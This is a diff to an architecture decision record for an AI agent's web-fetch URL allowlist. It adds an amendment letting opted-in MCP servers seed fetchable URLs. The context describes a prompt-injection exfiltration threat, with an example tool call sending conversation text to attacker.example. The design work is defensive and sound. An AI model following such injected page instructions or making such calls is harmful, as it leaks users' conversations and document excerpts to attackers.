@@ -131,6 +131,15 @@ IP actually being dialled, connecting only to vetted addresses. This also covers
 for free — the case a URL-only check misses.
 
 ### Prompt-injection exfiltration is in scope, and it shapes the tool
+> **Amended by [ADR 0067](0067-mcp-results-seed-the-fetch-allowlist.md) (2026-09-05) — the allowlist
+> gains a THIRD feeder, per-server and opt-in.** A remote MCP server the user has marked
+> `SeedsFetchableUrls` may seed the URLs in its tool results into a **separate**, separately-bounded
+> `AgentGrainState.SeededFetchableUrls`, which `IsFetchableUrl` also consults. The "whole URLs, not
+> hosts" reasoning below is **narrowed, not deleted**: it still holds verbatim for the two feeders named
+> here and for every server without the flag. What a seeding server gives up is the *verbatim* property
+> in the crux paragraph — a seeded URL was authored on a scraped page, not by a search engine or the
+> user. ADR 0067 states that cost, and its consequence for ADR 0066's threat model, in full.
+
 Once a fetched page's text is in context, an instruction *on that page* can tell the model to call
 `fetch_web_page("https://attacker.example/?q=<conversation text>")` — a clean exfiltration channel out of
 a conversation that may also carry document excerpts (ADR 0008). The SSRF guard cannot help: it permits
